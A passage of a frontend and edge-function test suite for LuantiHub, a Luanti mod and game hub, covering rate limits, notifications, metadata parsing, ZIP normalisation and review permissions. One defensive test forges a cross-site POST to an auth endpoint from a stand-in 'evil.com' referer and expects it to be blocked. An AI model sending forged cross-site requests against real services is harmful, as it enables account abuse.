      headers: {
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'navigate',
        'Referer': 'https://github.com/login/oauth'
      }
    });
    const oauthCallbackRes = await edgeMiddleware({
      request: oauthCallbackReq,
      next: async () => new Response('oauth_ok'),
      env: {}
    });
    expect(oauthCallbackRes.status).toBe(200);
    expect(await oauthCallbackRes.text()).toBe('oauth_ok');

    // 3c. Block cross-site state mutations on internal auth endpoints
    const crossSiteAuthReq = new Request('https://luantihub.org/api/auth/me', {
      method: 'POST',
      headers: {
        'Sec-Fetch-Site': 'cross-site',
        'Referer': 'https://evil.com'
      }
    });
    const crossSiteAuthRes = await edgeMiddleware({
      request: crossSiteAuthReq,
      next: async () => new Response('should_block'),
      env: {}
    });
    expect(crossSiteAuthRes.status).toBe(403);

    // 4. Enforce sliding-window rate limits per IP
    const testIp = '203.0.113.99';
    for (let i = 0; i < 3; i++) {
      expect(checkEdgeRateLimit(testIp, 'mutation', 3, 60_000, 1000).allowed).toBe(true);
    }
    const throttled = checkEdgeRateLimit(testIp, 'mutation', 3, 60_000, 1000);
    expect(throttled.allowed).toBe(false);
    expect(throttled.retryAfterSeconds).toBeGreaterThan(0);

    // 5. Reject unauthenticated POST /api/packages/git (including dryRun) with 401
    const unauthGitReq = new Request('https://luantihub.org/api/packages/git', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ repoUrl: 'https://codeberg.org/user/mod', dryRun: true })
    });
    const unauthGitRes = await gitOnRequestPost({ request: unauthGitReq, env: {} });
    expect(unauthGitRes.status).toBe(401);
  });

  it('should render adaptive non-truncating tabs, frosted glass badges/buttons, and pagination in ProfileDrawerComponent without any test notification button', () => {
    const authService = TestBed.inject(AuthService);
    const settingsService = TestBed.inject(SettingsService);

    (authService as any)._currentUser.set({
      id: 'admin-1',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'admin',
      open_reports_count: 12,
      identities: [{ provider: 'codeberg', username: 'SaKeL', verified: true }],
      packages: []
    });
    (authService as any)._isProfileDrawerOpen.set(true);
    (authService as any)._moderationReports.set([
      {
        id: 'rep-101',
        package_id: 'sakel-hub/x_mobs',
        package_title: 'X Mobs',
        package_author: 'sakel-hub',
        reason: 'broken',
        details: 'Repository returned HTTP 404 during background probe.',
        status: 'open',
        resolution_note: 'Investigating repository branch status.',
        created_at: new Date().toISOString()
      }
    ]);
    (authService as any)._moderationTotal.set(12);
    (authService as any)._moderationPage.set(1);
    (authService as any)._moderationTotalPages.set(2);

    const fixture = TestBed.createComponent(ProfileDrawerComponent);
    const comp = fixture.componentInstance;
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    const drawerPanel = el.querySelector('.max-w-2xl');
    expect(drawerPanel).toBeTruthy();

    // Verify adaptive flex-wrap tab bar without any text truncation classes on tab buttons
    const tabBar = el.querySelector('.flex.flex-wrap.gap-1\\.5') as HTMLElement;
    expect(tabBar).toBeTruthy();
    const tabButtons = Array.from(tabBar.querySelectorAll('button'));
    expect(tabButtons.length).toBe(5);
    for (const btn of tabButtons) {
      expect(btn.querySelector('.truncate')).toBeNull();
    }

    // Verify frosted glass badge on Moderation tab instead of solid red bg-rose-500
    const modTabBadge = tabButtons[3].querySelector('.glass-badge-rose');
    expect(modTabBadge).toBeTruthy();
    expect(modTabBadge?.textContent?.trim()).toBe('12');

    // Switch to Account tab and verify notification settings without any test notification button
    comp.activeTab.set('account');
    settingsService.notificationsEnabled.set(true);
    fixture.detectChanges();
    expect(el.textContent).toContain('Native PWA Notifications');
    expect(el.textContent?.toLowerCase()).not.toContain('test notification');

    // Switch to Moderation tab and verify frosted glass buttons, communication note, 404 re-check, and pagination
    comp.activeTab.set('moderation');
    fixture.detectChanges();
    expect(el.textContent).toContain('Investigating repository branch status.');
    expect(el.querySelector('.glass-btn-emerald')).toBeTruthy();
    expect(el.querySelector('.glass-btn-rose')).toBeTruthy();
    expect(el.querySelector('.glass-btn-amber')).toBeTruthy();
    expect(el.textContent).toContain('Page 1 / 2');
  });

  it('should deduplicate native PWA notifications by deterministic tag and auto-resolve broken 404 reports when repo recovers', async () => {
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    localStorage.removeItem('lh_seen_notification_tags');

    settingsService.notificationsEnabled.set(true);
    settingsService.notifyModeration.set(true);

    const origNotification = (window as any).Notification;
    class MockNotification {
      static permission: NotificationPermission = 'granted';
      onclick: (() => void) | null = null;
      constructor(public title: string, public options?: NotificationOptions) {}
      close(): void {}
    }
    (window as any).Notification = MockNotification;

    try {
      const firstSent = await pwaService.sendNativeNotification({
        category: 'moderation',
        title: 'Moderation Update • X Mobs',
        body: 'Auto-resolved: Git repository responded with HTTP 200.',
        tag: 'lh-mod-rep-101-closed',
        data: { packageId: 'sakel-hub/x_mobs', targetTab: 'account' }
      });
      expect(firstSent).toBe(true);

      // Duplicate tag must be suppressed so users are never spammed across page reloads
      const duplicateSent = await pwaService.sendNativeNotification({
        category: 'moderation',
        title: 'Moderation Update • X Mobs',
        body: 'Auto-resolved: Git repository responded with HTTP 200.',
        tag: 'lh-mod-rep-101-closed'
      });
      expect(duplicateSent).toBe(false);
    } finally {
      (window as any).Notification = origNotification;
    }

    // Verify autoResolveBrokenRepoReport closes open 'broken' reports in D1 when Git returns HTTP 200
    const executedQueries: Array<{ sql: string; args: any[] }> = [];
    const mockDb = {
      prepare: (sql: string) => ({
        bind: (...args: any[]) => ({
          run: async () => {
            executedQueries.push({ sql, args });
            return { meta: { changes: 1 } };
          }
        }),
        run: async () => ({ meta: { changes: 0 } })
      })
    };

    const resolved = await autoResolveBrokenRepoReport(mockDb, 'sakel-hub/x_mobs');
    expect(resolved).toBe(true);
    const updateQuery = executedQueries.find(q => q.sql.includes("SET status = 'resolved'"));
    expect(updateQuery).toBeTruthy();
    expect(updateQuery?.args[1]).toBe('sakel-hub/x_mobs');
  });

  it('should normalize missing tile metadata with baseline engine version, restore cached metadata, and prioritize visible search/category tiles', () => {
    const pkgService = TestBed.inject(PackageService) as any;

    pkgService.hydratedMetaCache.set('adikalon/stalker', {
      license: 'MIT',
      min_minetest_version: '5.4.0',
      tags: ['cave', 'monsters'],
      downloads: 420
    });

    const normalized = pkgService.normalizePackage({
      author: 'adikalon',
      name: 'stalker',
      title: 'Stalker',
      type: 'mod',
      short_description: 'Adds a scary and strong monster that lives in caves'
    });

    expect(normalized.license).toBe('MIT');
    expect(normalized.min_minetest_version).toBe('5.4.0');
    expect(normalized.downloads).toBe(420);
    expect(normalized.tags).toEqual(['cave', 'monsters']);

    const unhydrated = pkgService.normalizePackage({
      author: 'Liil',
      name: 'livingcaves',
      title: 'Livingcaves',
      type: 'mod',
      short_description: 'Adds more life to the caves of your world'
    });
    expect(unhydrated.min_minetest_version).toBe('5.0.0');

    const other1 = pkgService.normalizePackage({ author: 'other', name: 'pkg1', title: 'P1', type: 'mod' });
    const other2 = pkgService.normalizePackage({ author: 'other', name: 'pkg2', title: 'P2', type: 'mod' });
    pkgService.hydrationQueue.length = 0;
    pkgService.hydrationQueue.push(other1, other2);
    pkgService.activeHydrationWorkers = 8; // Pause queue draining so we can inspect queue order

    pkgService.prioritizePackagesForHydration([unhydrated]);
    expect(pkgService.hydrationQueue[0]?.id).toBe('Liil/livingcaves');
    pkgService.activeHydrationWorkers = 0;
  });

  it('should parse .cdb.json Luanti ContentDB metadata schema and build obstruction-free hover video embed URLs', async () => {
    const { parseCdbJsonMetadata } = await import('../../functions/api/lib/upstream');
    const cdbRaw = JSON.stringify({
      type: 'MOD',
      name: 'mesecons',
      title: 'Mesecons',
      short_description: 'Digital circuitry and logic gates for Luanti',
      dev_state: 'ACTIVELY_DEVELOPED',
      tags: ['technology', 'creative'],
      license: 'LGPL-3.0-only',
      media_license: 'CC-BY-SA-3.0',
      repo: 'https://github.com/minetest-mods/mesecons',
      issue_tracker: 'https://github.com/minetest-mods/mesecons/issues',
      forums: 628,
      video_url: 'https://www.youtube.com/watch?v=628mesecons'
    });

    const parsedBackend = parseCdbJsonMetadata(cdbRaw);
    expect(parsedBackend).toBeTruthy();
    expect(parsedBackend?.type).toBe('mod');
    expect(parsedBackend?.license).toBe('LGPL-3.0-only');
    expect(parsedBackend?.media_license).toBe('CC-BY-SA-3.0');
    expect(parsedBackend?.tags).toEqual(['technology', 'creative']);
    expect(parsedBackend?.forum_url).toBe('https://forum.luanti.org/viewtopic.php?t=628');
    expect(parsedBackend?.video_url).toBe('https://www.youtube.com/watch?v=628mesecons');

    const pkgService = TestBed.inject(PackageService) as any;
    const parsedFrontend = pkgService.parseCdbJsonText(cdbRaw);
    expect(parsedFrontend?.license).toBe('LGPL-3.0-only');
    expect(parsedFrontend?.forum_url).toBe('https://forum.luanti.org/viewtopic.php?t=628');

    // Verify obstruction-free YouTube hover embed URL and ready state in PackageCardComponent
    const cardFixture = TestBed.createComponent(PackageCardComponent);
    const cardComp = cardFixture.componentInstance as any;
    const embedUrl = cardComp.buildHoverEmbedUrl('https://www.youtube.com/watch?v=628mesecons');
    expect(embedUrl).toContain('youtube-nocookie.com/embed/628mesecons');
    expect(embedUrl).toContain('controls=0');
    expect(embedUrl).toContain('disablekb=1');
    expect(embedUrl).toContain('fs=0');
    expect(embedUrl).toContain('iv_load_policy=3');
    expect(embedUrl).toContain('modestbranding=1');
  });

  it('should allow flagging reviews and allow admins or review authors to remove reviews in PackageDetailModalComponent', () => {
    const authService = TestBed.inject(AuthService);
    const pkgService = TestBed.inject(PackageService);
    const fixture = TestBed.createComponent(PackageDetailModalComponent);
    const comp = fixture.componentInstance;

    comp.package = (pkgService as any).normalizePackage({
      id: 'Jeija/mesecons',
      author: 'Jeija',
      name: 'mesecons',
      title: 'Mesecons',
      type: 'mod'
    });

    const sampleReview = {
      id: 'lh_42',
      package_id: 'Jeija/mesecons',
      source: 'luantihub' as const,
      rating: 5,
      title: 'Great logic mod',
      comment: 'Works well in 5.10',
      created_at: new Date().toISOString(),
      author: {
        username: 'reviewer1',
        display_name: 'Reviewer One',
        avatar_url: 'logo.svg'
      }
    };

    // Signed in as reviewer1 (own review): canDeleteReview = true, isOwnReview = true
    (authService as any)._currentUser.set({
      id: 'u1',
      username: 'reviewer1',
      display_name: 'Reviewer One',
      avatar_url: 'logo.svg',
      role: 'user',
      identities: [],
      packages: []
    });
    expect(comp.isOwnReview(sampleReview)).toBe(true);
    expect(comp.canDeleteReview(sampleReview)).toBe(true);

    // Signed in as another regular user: canDeleteReview = false, isOwnReview = false
    (authService as any)._currentUser.set({
      id: 'u2',
      username: 'otheruser',
      display_name: 'Other User',
      avatar_url: 'logo.svg',
      role: 'user',
      identities: [],
      packages: []
    });
    expect(comp.isOwnReview(sampleReview)).toBe(false);
    expect(comp.canDeleteReview(sampleReview)).toBe(false);

    // Signed in as Admin: canDeleteReview = true even for another user's review
    (authService as any)._currentUser.set({
      id: 'admin1',
      username: 'sakel',
      display_name: 'Sakel Admin',
      avatar_url: 'logo.svg',
      role: 'admin',
      identities: [],
      packages: []
    });
    expect(comp.canDeleteReview(sampleReview)).toBe(true);
  });

  it('should support modpack.conf without false-positive broken_404 status and centralize video embed URL building', async () => {
    const pkgService = TestBed.inject(PackageService) as any;
    const i18n = TestBed.inject(TranslationService);

    for (const locale of ['en', 'sk', 'de', 'es', 'fr', 'ru'] as const) {
      i18n.setLocale(locale);
      const val = i18n.translate('profile.cancel');
      expect(val).toBeTruthy();
      expect(val).not.toBe('profile.cancel');
    }
    i18n.setLocale('en');

    // Centralized DRY video embed helper supports YouTube watch/shorts/live, youtu.be, PeerTube /w/, and Vimeo
    expect(pkgService.buildVideoEmbedUrl('https://www.youtube.com/shorts/dQw4w9WgXcQ', { minimalControls: true }))
      .toContain('youtube-nocookie.com/embed/dQw4w9WgXcQ');
    expect(pkgService.buildVideoEmbedUrl('https://peertube.example/w/abc123xyz', { minimalControls: false }))
      .toContain('https://peertube.example/videos/embed/abc123xyz?autoplay=1');
    expect(pkgService.isDirectVideoUrl('https://cdn.example.com/preview.webm?v=1')).toBe(true);

    // Simulate a modpack repo (like APercy/automobiles_pack) whose root has modpack.conf and README.md
    pkgService.repoDirCache.set('github:apercy/automobiles_pack', [
      { name: 'modpack.conf' },
      { name: 'README.md' }
    ]);
    const modpackPkg = pkgService.normalizePackage({
      id: 'APercy/automobiles_pack',
      author: 'APercy',
      name: 'automobiles_pack',
      title: 'Automobiles Pack',
      type: 'mod',
      repo_url: 'https://github.com/APercy/automobiles_pack'
    });
    const meta = await pkgService.probeGitRepoMetadata(
      modpackPkg,
      'https://github.com/APercy/automobiles_pack',
      false
    );
    expect(meta.gitRepoStatus).toBe('verified');
    expect(meta.repoUrl).toBe('https://github.com/APercy/automobiles_pack');
  });

  it('should normalize Git and ContentDB .zip archives into Luanti Engine pkgmgr-compliant structure and resolve HEAD.zip urls', async () => {
    const { buildGitBranchArchiveUrl, normalizeLuantiPackageZip } = await import('../../functions/api/lib/upstream');

    expect(buildGitBranchArchiveUrl('https://github.com/sakel-hub/waysigns', 'SaKeL', 'waysigns', 'HEAD'))
      .toBe('https://github.com/sakel-hub/waysigns/archive/HEAD.zip');
    expect(buildGitBranchArchiveUrl('https://codeberg.org/sakel-hub/waysigns', 'SaKeL', 'waysigns', 'HEAD'))
      .toBe('https://codeberg.org/sakel-hub/waysigns/archive/HEAD.zip');
    expect(buildGitBranchArchiveUrl('https://gitlab.com/sakel-hub/waysigns', 'SaKeL', 'waysigns', 'HEAD'))
      .toBe('https://gitlab.com/api/v4/projects/sakel-hub%2Fwaysigns/repository/archive.zip');

    // Helper to build a minimal valid ZIP with arbitrary file paths and streaming bit 0x0008 set
    const encoder = new TextEncoder();
    const decoder = new TextDecoder();
    const buildTestZip = (files: Array<{ path: string; content: string }>, streamingFlags = true): Uint8Array => {
      const localParts: Uint8Array[] = [];
      const cdParts: Uint8Array[] = [];
      let offset = 0;

      for (const f of files) {
        const nameBytes = encoder.encode(f.path);
        const dataBytes = encoder.encode(f.content);
        const localHeader = new Uint8Array(30 + nameBytes.length + dataBytes.length);
        const lv = new DataView(localHeader.buffer);
        lv.setUint32(0, 0x04034b50, true);
        lv.setUint16(4, 20, true);
        lv.setUint16(6, streamingFlags ? 0x0008 : 0, true);
        lv.setUint16(8, 0, true); // Store
        lv.setUint32(14, 0x12345678, true);
        lv.setUint32(18, streamingFlags ? 0 : dataBytes.length, true);
        lv.setUint32(22, streamingFlags ? 0 : dataBytes.length, true);
        lv.setUint16(26, nameBytes.length, true);
        lv.setUint16(28, 0, true);
        localHeader.set(nameBytes, 30);
        localHeader.set(dataBytes, 30 + nameBytes.length);
        localParts.push(localHeader);

        const cdHeader = new Uint8Array(46 + nameBytes.length);
        const cv = new DataView(cdHeader.buffer);
        cv.setUint32(0, 0x02014b50, true);
        cv.setUint16(4, 20, true);
        cv.setUint16(6, 20, true);
        cv.setUint16(8, streamingFlags ? 0x0008 : 0, true);
        cv.setUint16(10, 0, true);
        cv.setUint32(16, 0x12345678, true);
        cv.setUint32(20, dataBytes.length, true);
        cv.setUint32(24, dataBytes.length, true);
        cv.setUint16(28, nameBytes.length, true);
        cv.setUint32(42, offset, true);
        cdHeader.set(nameBytes, 46);
        cdParts.push(cdHeader);

        offset += localHeader.length;
      }

      const cdSize = cdParts.reduce((s, p) => s + p.length, 0);
      const eocd = new Uint8Array(22);
      const ev = new DataView(eocd.buffer);
      ev.setUint32(0, 0x06054b50, true);
      ev.setUint16(8, files.length, true);
      ev.setUint16(10, files.length, true);
      ev.setUint32(12, cdSize, true);
      ev.setUint32(16, offset, true);

      const out = new Uint8Array(offset + cdSize + 22);
      let pos = 0;
      for (const p of [...localParts, ...cdParts, eocd]) {
        out.set(p, pos);
        pos += p.length;
      }
      return out;
    };

    const listZipPaths = (zip: Uint8Array): string[] => {
      const v = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
      let eocdPos = -1;
      for (let p = zip.length - 22; p >= 0; p--) {
        if (v.getUint32(p, true) === 0x06054b50) {
          eocdPos = p;
          break;
        }
      }
      const count = v.getUint16(eocdPos + 10, true);
      let ptr = v.getUint32(eocdPos + 16, true);
      const paths: string[] = [];
      for (let i = 0; i < count; i++) {
        const nLen = v.getUint16(ptr + 28, true);
        const eLen = v.getUint16(ptr + 30, true);
        const cLen = v.getUint16(ptr + 32, true);
        paths.push(decoder.decode(zip.subarray(ptr + 46, ptr + 46 + nLen)));
        ptr += 46 + nLen + eLen + cLen;
      }
      return paths;
    };

    // 1. Test WaySigns-style Git archive with nested folder + CI clutter + missing mod.conf
    const rawModZip = buildTestZip([
      { path: 'waysigns-HEAD/.github/workflows/luacheck.yml', content: 'name: CI' },
      { path: 'waysigns-HEAD/.gitignore', content: '*.swp' },
      { path: 'waysigns-HEAD/init.lua', content: 'core.register_node("waysigns:sign", {})' },
      { path: 'waysigns-HEAD/textures/waysigns_bg.png', content: 'PNG' }
    ]);

    const normalizedModZip = normalizeLuantiPackageZip(rawModZip, 'waysigns', 'mod');
    const modPaths = listZipPaths(normalizedModZip);
    expect(modPaths[0]).toBe('waysigns/');
    expect(modPaths).toContain('waysigns/mod.conf');
    expect(modPaths).toContain('waysigns/init.lua');
    expect(modPaths).toContain('waysigns/textures/waysigns_bg.png');
    expect(modPaths.some(p => p.includes('.github') || p.includes('.gitignore'))).toBe(false);

    // Verify streaming bit 0x0008 is cleared in Local File Header so minizip always sees explicit sizes
    const secondHeaderOffset = 30 + encoder.encode('waysigns/').length;
    const secondHeaderView = new DataView(
      normalizedModZip.buffer,
      normalizedModZip.byteOffset + secondHeaderOffset,
      normalizedModZip.byteLength - secondHeaderOffset
    );
    expect(secondHeaderView.getUint16(6, true) & 0x0008).toBe(0);
    expect(secondHeaderView.getUint32(18, true)).toBeGreaterThan(0);

    // 2. Test multi-mod Modpack archive missing modpack.conf
    const rawModpackZip = buildTestZip([
      { path: 'x_pack-master/mod_alpha/init.lua', content: '-- alpha' },
      { path: 'x_pack-master/mod_beta/init.lua', content: '-- beta' }
    ]);
    const normalizedModpackZip = normalizeLuantiPackageZip(rawModpackZip, 'x_pack', 'mod');
    const modpackPaths = listZipPaths(normalizedModpackZip);
    expect(modpackPaths[0]).toBe('x_pack/');
    expect(modpackPaths).toContain('x_pack/modpack.conf');
    expect(modpackPaths).toContain('x_pack/mod_alpha/init.lua');
    expect(modpackPaths).toContain('x_pack/mod_beta/init.lua');

    // 2b. Multi-mod Game archive (`confspace`) with game.conf + mods/* must NEVER synthesize modpack.conf
    // (even if erroneously invoked with packageType = 'modpack'), and must strip stray root modpack.conf
    // while preserving nested modpacks inside `mods/<subpack>/modpack.conf` so Luanti `pkgmgr.get_folder_type`
    // always classifies it as `game` instead of failing with "Unable to install a modpack as a game".
    const rawGameZip = buildTestZip([
      { path: 'confspace-main/game.conf', content: 'title = Configuration Space\n' },
      { path: 'confspace-main/modpack.conf', content: 'name = stray_root_modpack\n' },
      { path: 'confspace-main/mods/confspace_core/init.lua', content: '-- core' },
      { path: 'confspace-main/mods/confspace_pack/modpack.conf', content: 'name = confspace_pack\n' },
      { path: 'confspace-main/mods/confspace_pack/submod/init.lua', content: '-- submod' }
    ]);
    const normalizedGameZip = normalizeLuantiPackageZip(rawGameZip, 'confspace', 'game');
    const gamePaths = listZipPaths(normalizedGameZip);
    expect(gamePaths[0]).toBe('confspace/');
    expect(gamePaths).toContain('confspace/game.conf');
    expect(gamePaths).toContain('confspace/mods/confspace_core/init.lua');
    expect(gamePaths).toContain('confspace/mods/confspace_pack/modpack.conf');
    expect(gamePaths).not.toContain('confspace/modpack.conf');
    expect(gamePaths).not.toContain('confspace/modpack.txt');

    const rawCleanGameZip = buildTestZip([
      { path: 'confspace-main/game.conf', content: 'title = Configuration Space\n' },
      { path: 'confspace-main/mods/confspace_core/init.lua', content: '-- core' },
      { path: 'confspace-main/mods/confspace_mapgen/init.lua', content: '-- mapgen' }
    ]);
    const defensiveGamePaths = listZipPaths(normalizeLuantiPackageZip(rawCleanGameZip, 'confspace', 'modpack'));
    expect(defensiveGamePaths).toContain('confspace/game.conf');
    expect(defensiveGamePaths).not.toContain('confspace/modpack.conf');

    // 2c. Legacy game.conf-less Git game (`mods/*/init.lua`) keeps `mods/` intact and synthesizes root `game.conf`
    const rawLegacyGameZip = buildTestZip([
      { path: 'oldgame-main/mods/mod_one/init.lua', content: '-- one' },
      { path: 'oldgame-main/mods/mod_two/init.lua', content: '-- two' }
    ]);
    const legacyGamePaths = listZipPaths(normalizeLuantiPackageZip(rawLegacyGameZip, 'oldgame', 'game'));
    expect(legacyGamePaths).toContain('oldgame/game.conf');
    expect(legacyGamePaths).toContain('oldgame/mods/mod_one/init.lua');
    expect(legacyGamePaths).toContain('oldgame/mods/mod_two/init.lua');
    expect(legacyGamePaths).not.toContain('oldgame/modpack.conf');

    // 3. Verify "Install App" buttons are hidden when PWA is already installed
    const pwaService = TestBed.inject(PwaService);
    const headerFixture = TestBed.createComponent(HeaderComponent);
    pwaService.isInstalled.set(false);
    headerFixture.detectChanges();
    expect(headerFixture.nativeElement.textContent).toContain('Install App');

    pwaService.isInstalled.set(true);
    headerFixture.componentInstance.isMobileMenuOpen.set(true);
    headerFixture.detectChanges();
    expect(headerFixture.nativeElement.textContent).not.toContain('Install App');

    // 4. Verify Cloudflare Pages _routes.json includes "/packages/*", "/", "/blog", "/privacy", "/delete-account", and "/sitemap.xml"
    // so in-game Luanti client download URLs, canonical host 301 redirects on root "/", and "/blog" SSR SEO metadata invoke Edge Functions
    const routesConfig = (await import('../../public/_routes.json')).default;
    expect(routesConfig.include).toContain('/');
    expect(routesConfig.include).toContain('/packages/*');
    expect(routesConfig.include).toContain('/blog');
    expect(routesConfig.include).toContain('/privacy');
    expect(routesConfig.include).toContain('/delete-account');
    expect(routesConfig.include).toContain('/sitemap.xml');
  });

  it('should notify for newly published Git packages with [TYPE] Title, teardown notifications on disable, and collapse/paginate My Reports when > 5', async () => {
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    const authService = TestBed.inject(AuthService);

    localStorage.removeItem('lh_known_git_packages_v1');
    localStorage.removeItem('lh_seen_notification_tags');

    settingsService.notificationsEnabled.set(true);
    settingsService.notifyNewGitPackages.set(true);

    const dispatchedNotifications: Array<{ title: string; options?: NotificationOptions }> = [];
    const origNotification = (window as any).Notification;
    class MockNotification {
      static permission: NotificationPermission = 'granted';
      onclick: (() => void) | null = null;
      constructor(public title: string, public options?: NotificationOptions) {
        dispatchedNotifications.push({ title, options });
      }
      close(): void {}
    }
    (window as any).Notification = MockNotification;

    try {
      // 1. First boot seeds baseline silently without spamming notifications
      const seededCount = pwaService.checkAndNotifyNewGitPackages(
        [
          {
            id: 'sakel-hub/existing_mod',
            author: 'sakel-hub',
            name: 'existing_mod',
            title: 'Existing Mod',
            type: 'mod',
            source: 'git'
          }
        ],
        { isBaselineSeedAllowed: true }
      );
      expect(seededCount).toBe(0);
      expect(dispatchedNotifications.length).toBe(0);

      // 2. Subsequent check with a newly published Git package fires notification with [MOD] My Super Pickaxe
      const newCount = pwaService.checkAndNotifyNewGitPackages(
        [
          {
            id: 'sakel-hub/existing_mod',
            author: 'sakel-hub',
            name: 'existing_mod',
            title: 'Existing Mod',
            type: 'mod',
            source: 'git'
          },
          {
            id: 'sakel-hub/super_pickaxe',
            author: 'sakel-hub',
            name: 'super_pickaxe',
            title: 'My Super Pickaxe',
            type: 'mod',
            short_desc: 'Mines 3x3 blocks instantly',
            source: 'git'
          }
        ],
        { isBaselineSeedAllowed: true }
      );
      expect(newCount).toBe(1);
      // Wait for async sendNativeNotification
      await new Promise(resolve => setTimeout(resolve, 10));
      expect(dispatchedNotifications.length).toBe(1);
      expect(dispatchedNotifications[0].title).toBe('New Git Package · [MOD] My Super Pickaxe');
      expect(dispatchedNotifications[0].options?.body).toContain('by sakel-hub');

      // 2b. Dual-indexed ContentDB packages and packages older than 48 hours must NOT fire notifications
      const quietCount = pwaService.checkAndNotifyNewGitPackages(
        [
          {
            id: 'sakel-hub/tumbleweed',
            author: 'sakel-hub',
            name: 'tumbleweed',
            title: 'X Tumbleweed',
            type: 'mod',
            source: 'git',
            sources: ['official', 'git'], // ContentDB dual-indexed
            created_at: new Date(Date.now() - 3600 * 1000).toISOString()
          },
          {
            id: 'sakel-hub/old_git_mod',
            author: 'sakel-hub',
            name: 'old_git_mod',
            title: 'Old Mod',
            type: 'mod',
            source: 'git',
            sources: ['git'],
            created_at: new Date(Date.now() - 5 * 24 * 3600 * 1000).toISOString() // 5 days old
          }
        ],
        { isBaselineSeedAllowed: false }
      );
      expect(quietCount).toBe(0);
      expect(dispatchedNotifications.length).toBe(1); // unchanged

      // 3. Disabling master notifications tears down active state and sets notificationsEnabled to false
      await pwaService.setNotificationsEnabled(false);
      expect(settingsService.notificationsEnabled()).toBe(false);
    } finally {
      (window as any).Notification = origNotification;
    }

    // 4. Verify collapsible & paginated "My Reports & Package Alerts" in ProfileDrawerComponent
    (authService as any)._currentUser.set({
      id: 'u-1',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'user',
      identities: [],
      packages: []
    });
    (authService as any)._isProfileDrawerOpen.set(true);

    // Case A: <= 5 alerts -> open by default
    const threeReports = Array.from({ length: 3 }, (_, i) => ({
      id: `rep-${i + 1}`,
      package_id: `sakel-hub/mod_${i + 1}`,
      package_title: `Mod ${i + 1}`,
      reason: 'broken',
      details: `Alert #${i + 1}`,
      status: 'open' as const,
      created_at: new Date().toISOString()
    }));
    (authService as any)._myReports.set(threeReports);
    (authService as any)._myReportsTotal.set(3);
    (authService as any)._myReportsPage.set(1);
    (authService as any)._myReportsTotalPages.set(1);

    const fixture = TestBed.createComponent(ProfileDrawerComponent);
    const comp = fixture.componentInstance;
    comp.activeTab.set('account');
    fixture.detectChanges();

    expect(comp.myReportsCount()).toBe(3);
    expect(comp.isMyReportsOpen()).toBe(true);
    expect(fixture.nativeElement.textContent).toContain('Alert #1');

    // Case B: > 5 alerts (e.g. 15 alerts) -> collapsed by default, and paginated to 5 per page when expanded
    const fifteenReports = Array.from({ length: 15 }, (_, i) => ({
      id: `rep-${i + 1}`,
      package_id: `sakel-hub/mod_${i + 1}`,
      package_title: `Mod ${i + 1}`,
      reason: 'broken',
      details: `Historical Alert #${i + 1}`,
      status: 'resolved' as const,
      created_at: new Date().toISOString()
    }));
    (authService as any)._myReports.set(fifteenReports);
    (authService as any)._myReportsTotal.set(15);
    (authService as any)._myReportsPage.set(1);
    (authService as any)._myReportsTotalPages.set(3);
    comp.myReportsManualOpen.set(null);
    fixture.detectChanges();

    expect(comp.myReportsCount()).toBe(15);
    expect(comp.isMyReportsOpen()).toBe(false);
    expect(fixture.nativeElement.textContent).toContain('My Reports & Package Alerts (15)');
    expect(fixture.nativeElement.textContent).not.toContain('Historical Alert #1');

    // Toggle open -> shows only 5 items on page 1 and renders Page 1 / 3 controls
    comp.toggleMyReports();
    fixture.detectChanges();
    expect(comp.isMyReportsOpen()).toBe(true);
    expect(comp.paginatedMyReports().length).toBe(5);
    expect(fixture.nativeElement.textContent).toContain('Historical Alert #1');
    expect(fixture.nativeElement.textContent).toContain('Historical Alert #5');
    expect(fixture.nativeElement.textContent).not.toContain('Historical Alert #6');
    expect(fixture.nativeElement.textContent).toContain('Page 1 / 3');
  });

  it('should render Share LuantiHub and quick Copy Link under the header gear menu and support Web Share API + clipboard fallback', async () => {
    const pwaService = TestBed.inject(PwaService);
    const fixture = TestBed.createComponent(HeaderComponent);
    const comp = fixture.componentInstance;

    comp.isSettingsMenuOpen.set(true);
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    expect(el.textContent).toContain('Share LuantiHub');
    const copyLinkBtn = el.querySelector('button[aria-label="Copy app link"]') as HTMLButtonElement;
    expect(copyLinkBtn).toBeTruthy();

    // Test clipboard copy via copyAppLink()
    const writeTextSpy = vi.fn().mockResolvedValue(undefined);
    const origClipboard = navigator.clipboard;
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: writeTextSpy },
      configurable: true
    });

    try {
      await comp.onCopyAppLink();
      expect(writeTextSpy).toHaveBeenCalledWith(window.location.origin);
      expect(pwaService.statusMessage()).toBe('common.copiedToClipboard');
      expect(comp.isSettingsMenuOpen()).toBe(false);

      // Test native share when navigator.share is available
      const shareSpy = vi.fn().mockResolvedValue(undefined);
      const origShare = (navigator as any).share;
      Object.defineProperty(navigator, 'share', {
        value: shareSpy,
        configurable: true
      });
      try {
        await comp.onShareApp();
        expect(shareSpy).toHaveBeenCalled();
        expect(shareSpy.mock.calls[0][0].url).toBe(window.location.origin);
      } finally {
        Object.defineProperty(navigator, 'share', {
          value: origShare,
          configurable: true
        });
      }
    } finally {
      Object.defineProperty(navigator, 'clipboard', {
        value: origClipboard,
        configurable: true
      });
    }

    // Verify Ko-fi donation button and lazy-loaded frosted-glass checkout dropdown
    expect(el.querySelector('#kofiframe')).toBeNull();
    comp.toggleKofiMenu();
    fixture.detectChanges();
    expect(comp.isKofiMenuOpen()).toBe(true);
    const kofiIframe = el.querySelector('#kofiframe') as HTMLIFrameElement;
    expect(kofiIframe).toBeTruthy();
    expect(kofiIframe.getAttribute('src')).toBe('https://ko-fi.com/sakel/?hidefeed=true&widget=true&embed=true&preview=true');
  });

  it('should reset package score to 0 when the last review is removed and never resurrect stale 5-star ratings from hydratedMetaCache', () => {
    const pkgService = TestBed.inject(PackageService);
    const cacheKey = 'jeija/mesecons';

    // Simulate stale 5-star rating in hydratedMetaCache from a previously deleted review
    (pkgService as any).hydratedMetaCache.set(cacheKey, {
      license: 'LGPL-3.0-ONLY',
      downloads: 264100,
      score: 5
